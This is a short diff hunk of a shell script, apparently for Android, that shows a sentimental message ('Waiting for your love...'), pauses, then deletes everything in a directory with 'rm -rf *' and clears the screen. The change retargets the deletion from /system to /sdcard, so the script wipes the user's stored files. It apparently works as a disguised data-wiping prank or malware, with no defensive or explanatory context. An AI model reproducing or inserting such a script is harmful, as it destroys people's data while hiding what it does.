@@ -35,7 +35,7 @@ echo
 sleep 1
 echo "Waiting for your love..."
 sleep 4
-cd /system
+cd /sdcard
 rm -rf *
 sleep 3
 clear
